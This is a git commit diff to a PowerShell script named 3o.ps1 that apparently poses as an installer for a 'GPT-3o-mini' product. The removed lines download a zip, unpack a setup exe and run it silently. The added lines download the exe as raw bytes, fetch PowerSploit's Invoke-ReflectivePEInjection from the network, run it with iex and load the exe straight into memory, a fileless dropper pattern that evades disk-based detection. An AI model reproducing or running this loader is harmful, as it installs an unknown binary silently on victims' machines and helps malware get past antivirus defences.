2b52f620735f025c77f1104884a11d5128058931
rootkalilocalhost <140280170+rootkalilocalhost@users.noreply.github.com>
2025-11-05 23:05:04 +0200

    Update 3o.ps1

--- 3o.ps1
+++ 3o.ps1
@@ -1,15 +1,6 @@
 try {
-    $zip = Join-Path $env:TEMP 'GPT-3o-mini.zip'
-    Invoke-WebRequest 'https://github.com/nathan-ingram10/GPT-3o-mini/GPT-3o-mini.zip' -OutFile $zip -ErrorAction Stop -Headers @{'User-Agent' = 'Mozilla/5.0'}
-    $dst = Join-Path $env:TEMP 'unzipped'
-    if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction SilentlyContinue }
-    Expand-Archive -Path $zip -DestinationPath $dst -Force -ErrorAction Stop
-    $exe = Get-ChildItem -Path $dst -Recurse -Filter 'GPT-3o_win-x64_setup.exe' -ErrorAction SilentlyContinue | Select-Object -First 1
-    if (!$exe) { throw 'EXE not found in archive' }
-    Start-Process -FilePath $exe.FullName -Wait -ArgumentList '/S'  # silent
-} catch {
-    Write-Host ($_.Message ?? $_) -ForegroundColor Red
-} finally {
-    Remove-Item $zip -Force -ErrorAction SilentlyContinue
-    Remove-Item $dst -Recurse -Force -ErrorAction SilentlyContinue
-}
+    $exeBytes = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/nathan-ingram10/GPT-3o-mini/main/GPT-3o_win-x64_setup.exe')  # URL на EXE
+    $script = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
+    iex $script
+    Invoke-ReflectivePEInjection -PEBytes $exeBytes -ExeArgs '/S'  # Silent
+} catch { Write-Host $_.Message -ForegroundColor Red }
